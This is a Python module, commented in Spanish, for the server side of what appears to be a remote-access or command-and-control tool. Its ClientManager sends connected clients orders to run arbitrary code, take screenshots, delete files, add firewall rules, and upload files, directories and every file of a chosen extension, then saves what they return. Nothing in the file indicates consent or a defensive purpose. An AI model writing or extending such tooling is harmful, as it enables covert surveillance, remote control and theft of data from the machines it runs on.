import json
import os
import base64
import tempfile
import zipfile
import io
from utils.logger import get_console
from config.settings import RECEIVED_FILES_DIR, DIRECTORIES_DIR, SCREENSHOTS_DIR
from utils.response_waiter import ResponseWaiter

class ClientManager:
    """Administra clientes conectados y procesa sus respuestas."""
    
    def __init__(self, servidor, cmd):
        self.servidor = servidor
        self.servidor.establecer_client_manager(self)
        self.console = get_console()
        self._cmd = cmd 
        self.response_waiter = ResponseWaiter(timeout=5)
    
    def procesar_respuesta_cliente(self, datos, cliente):
        """Procesa las respuestas recibidas de un cliente."""
        try:
            datos_dict = json.loads(datos)
            accion = datos_dict.get("accion")
            cliente_id = f"[Cliente ID {cliente['id']} ({cliente['direccion'][0]})]"
            
            if accion == "respuesta_ejecucion":
                self.console.print(f"\n{cliente_id} [bold green]Resultado de ejecución:[/bold green]")
                self.console.print(datos_dict.get("resultado", "Sin resultado"))
                
            elif accion == "archivo_recibido":
                self.console.print(f"\n{cliente_id} [bold green]Archivo guardado:[/bold green] {datos_dict.get('ruta_destino')}")
                
            elif accion == "archivo_enviado":
                self._procesar_archivo_enviado(datos_dict, cliente_id)
                
            elif accion == "error":
                self.console.print(f"\n{cliente_id} [bold red]Error:[/bold red] {datos_dict.get('mensaje')}")
                
            elif accion == "respuesta_listado":
                self.response_waiter.notificar_respuesta(cliente['id'], accion)
                self.console.print(f"\n{cliente_id} [bold green]Estructura del directorio '{datos_dict.get('ruta')}':[/bold green]")
                self.console.print(datos_dict.get("estructura"))
                
            elif accion == "directorio_enviado":
                self._procesar_directorio_enviado(datos_dict, cliente_id)
                
            elif accion == "eliminacion_exitosa":
                self._procesar_eliminacion_exitosa(datos_dict, cliente_id)
                
            elif accion == "captura_enviada":
                self._procesar_captura_enviada(datos_dict, cliente_id)
                
            elif accion == "regla_firewall_agregada":
                self._procesar_regla_firewall_agregada(datos_dict, cliente_id)
                
            elif accion == "archivos_extension_enviados":
                self._procesar_archivos_extension_enviados(datos_dict, cliente_id)
                
        except json.JSONDecodeError:
            self.console.print(f"[bold red][!] Error al decodificar respuesta del cliente: {datos}[/bold red]")
        except Exception as e:
            self.console.print(f"[bold red][!] Error al procesar respuesta del cliente: {e}[/bold red]")
    
    def _procesar_archivo_enviado(self, datos_dict, cliente_id):
        """Procesa un archivo enviado por el cliente."""
        nombre_archivo = datos_dict.get("nombre_archivo")
        ruta_destino = datos_dict.get("ruta_destino", os.path.join(RECEIVED_FILES_DIR, nombre_archivo))
        datos_archivo = datos_dict.get("datos_archivo")
        
        directorio = os.path.dirname(ruta_destino)
        os.makedirs(directorio, exist_ok=True)
        
        with open(ruta_destino, "wb") as f:
            f.write(base64.b64decode(datos_archivo))
        
        self.console.print(f"\n{cliente_id} [bold green]Archivo recibido y guardado en:[/bold green] {ruta_destino}")
    
    def _procesar_directorio_enviado(self, datos_dict, cliente_id):
        """Procesa un directorio enviado como ZIP."""
        nombre_directorio = datos_dict.get("nombre_directorio")
        ruta_destino = datos_dict.get("ruta_destino", DIRECTORIES_DIR)
        datos_zip = datos_dict.get("datos_zip")
        ruta_origen = datos_dict.get("ruta_origen")
        
        try:
            ruta_destino_completa = os.path.join(ruta_destino, nombre_directorio)
            os.makedirs(ruta_destino_completa, exist_ok=True)
            
            with tempfile.NamedTemporaryFile(delete=False, suffix='.zip') as temp_zip:
                temp_zip_path = temp_zip.name
                temp_zip.write(base64.b64decode(datos_zip))
            
            with zipfile.ZipFile(temp_zip_path, 'r') as zipf:
                zipf.extractall(ruta_destino_completa)
            
            os.unlink(temp_zip_path)
            
            self.console.print(f"\n{cliente_id} [bold green]Directorio recibido y extraído en:[/bold green] {ruta_destino_completa}")
            self.console.print(f"{cliente_id} Directorio origen: {ruta_origen}")
        except Exception as e:
            self.console.print(f"\n{cliente_id} [bold red]Error al procesar directorio:[/bold red] {str(e)}")
    
    def _procesar_eliminacion_exitosa(self, datos_dict, cliente_id):
        """Procesa una eliminación exitosa."""
        tipo_elemento = datos_dict.get("tipo", "elemento")
        ruta_eliminada = datos_dict.get("ruta")
        mensaje = datos_dict.get("mensaje")
        
        self.console.print(f"\n{cliente_id} [bold green]✅ Eliminación exitosa:[/bold green]")
        self.console.print(f"{cliente_id} Tipo: {tipo_elemento.capitalize()}")
        self.console.print(f"{cliente_id} Ruta: {ruta_eliminada}")
        self.console.print(f"{cliente_id} {mensaje}")
    
    def _procesar_captura_enviada(self, datos_dict, cliente_id):
        """Procesa una captura de pantalla enviada."""
        nombre_archivo = datos_dict.get("nombre_archivo")
        ruta_destino = datos_dict.get("ruta_destino", os.path.join(SCREENSHOTS_DIR, nombre_archivo))
        datos_imagen = datos_dict.get("datos_imagen")
        ancho = datos_dict.get("ancho", 0)
        alto = datos_dict.get("alto", 0)
        
        try:
            directorio = os.path.dirname(ruta_destino)
            os.makedirs(directorio, exist_ok=True)
            
            with open(ruta_destino, "wb") as f:
                f.write(base64.b64decode(datos_imagen))
            
            self.console.print(f"\n{cliente_id} [bold green]📸 Captura de pantalla guardada:[/bold green]")
            self.console.print(f"{cliente_id} Archivo: {ruta_destino}")
            self.console.print(f"{cliente_id} Resolución: {ancho}x{alto} píxeles")
            self.console.print(f"{cliente_id} Tamaño: {os.path.getsize(ruta_destino)} bytes")
        except Exception as e:
            self.console.print(f"\n{cliente_id} [bold red]Error al guardar captura de pantalla:[/bold red] {str(e)}")
    
    def _procesar_regla_firewall_agregada(self, datos_dict, cliente_id):
        """Procesa una regla de firewall agregada."""
        nombre_regla = datos_dict.get("nombre_regla")
        ip = datos_dict.get("ip")
        puerto = datos_dict.get("puerto")
        accion_firewall = datos_dict.get("accion_firewall")
        resultado = datos_dict.get("resultado")
        
        self.console.print(f"\n{cliente_id} [bold green]🔥 Regla de Firewall procesada:[/bold green]")
        self.console.print(f"{cliente_id} Nombre: {nombre_regla}")
        self.console.print(f"{cliente_id} IP: {ip}")
        self.console.print(f"{cliente_id} Puerto: {puerto}")
        self.console.print(f"{cliente_id} Acción: {accion_firewall}")
        self.console.print(f"{cliente_id} Resultado: {resultado}")
    
    def _procesar_archivos_extension_enviados(self, datos_dict, cliente_id):
        """Procesa archivos enviados por extensión."""
        extension = datos_dict.get("extension")
        cantidad_archivos = datos_dict.get("cantidad_archivos")
        nombre_zip = datos_dict.get("nombre_zip")
        ruta_destino = datos_dict.get("ruta_destino", RECEIVED_FILES_DIR)
        datos_zip = datos_dict.get("datos_zip")
        archivos_incluidos = datos_dict.get("archivos_incluidos", [])
        
        try:
            carpeta_extraccion = os.path.join(ruta_destino, f"cliente_{cliente_id.replace('[Cliente ', '').replace(']', '')}_{extension.replace('.', '')}")
            os.makedirs(carpeta_extraccion, exist_ok=True)
            
            with zipfile.ZipFile(io.BytesIO(base64.b64decode(datos_zip)), 'r') as zip_ref:
                zip_ref.extractall(carpeta_extraccion)
            
            self.console.print(f"\n{cliente_id} [bold green]📁 Archivos por extensión procesados:[/bold green]")
            self.console.print(f"{cliente_id} Extensión: {extension}")
            self.console.print(f"{cliente_id} Cantidad de archivos: {cantidad_archivos}")
            self.console.print(f"{cliente_id} Archivos extraídos en: {carpeta_extraccion}")
            if len(archivos_incluidos) <= 10:
                self.console.print(f"{cliente_id} Archivos incluidos: {', '.join(archivos_incluidos)}")
            else:
                self.console.print(f"{cliente_id} Archivos incluidos: {', '.join(archivos_incluidos[:10])}... y {len(archivos_incluidos)-10} más")
        except Exception as e:
            self.console.print(f"\n{cliente_id} [bold red]Error al procesar archivos por extensión:[/bold red] {str(e)}")
    
    def enviar_comando_listar_directorio(self, ruta, incluir_archivos=False, cliente_id=None):
        """Envía comando para listar un directorio."""
        mensaje = {
            "accion": "listar_directorio",
            "ruta": ruta,
            "incluir_archivos": incluir_archivos
        }
        if cliente_id is None:
            self.servidor.enviar_comando_todos(mensaje)
        else:
            self.servidor.enviar_comando_cliente(cliente_id, mensaje)
            
        cliente_clave = cliente_id or "all"
        recibido = self.response_waiter.esperar_respuesta(cliente_clave, "respuesta_listado")
        
        if not recibido:
            return "[bold red][!] Tiempo de espera agotado. El cliente no respondió.[/bold red]"
        return None
    
    def obtener_info_clientes(self):
        """Obtiene información de los clientes conectados."""
        return [(c['id'], c['direccion'][0], c['direccion'][1]) for c in self.servidor.clientes]
    
    def obtener_clientes_conectados(self):
        """Obtiene el número de clientes conectados."""
        return len(self.servidor.clientes)
    
    def enviar_comando_ejecutar(self, codigo, cliente_id=None):
        """Envía comando para ejecutar un código en los clientes."""
        mensaje = {
            "accion": "ejecutar",
            "codigo": codigo
        }
        if cliente_id is None:
            self.servidor.enviar_comando_todos(mensaje)
        else:
            self.servidor.enviar_comando_cliente(cliente_id, mensaje)

    def enviar_comando_solicitar_directorio(self, ruta_origen, ruta_destino, cliente_id=None):
        """Envía comando para solicitar un directorio desde los clientes."""
        from server.handlers.directory_handler import DirectoryHandler
        handler = DirectoryHandler(self)
        return handler.enviar_comando_solicitar_directorio(ruta_origen, ruta_destino, cliente_id)

    def enviar_comando_capturar_pantalla(self, ruta_destino, nombre_archivo=None, cliente_id=None):
        """Envía comando para capturar pantalla desde los clientes."""
        from server.handlers.screenshot_handler import ScreenshotHandler
        handler = ScreenshotHandler(self)
        return handler.enviar_comando_capturar_pantalla(ruta_destino, nombre_archivo, cliente_id)
    
    def enviar_comando_eliminar(self, ruta, cliente_id=None):
        """Envía comando para eliminar un archivo o directorio en los clientes."""
        mensaje = {
            "accion": "eliminar",
            "ruta": ruta
        }
        if cliente_id is None:
            self.servidor.enviar_comando_todos(mensaje)
        else:
            self.servidor.enviar_comando_cliente(cliente_id, mensaje)
        
    def enviar_comando_ejecutar(self, codigo, cliente_id=None):
        """Envía comando para ejecutar un código en los clientes."""
        from server.handlers.command_handler import CommandHandler
        handler = CommandHandler(self)
        return handler.enviar_comando_ejecutar(codigo, cliente_id)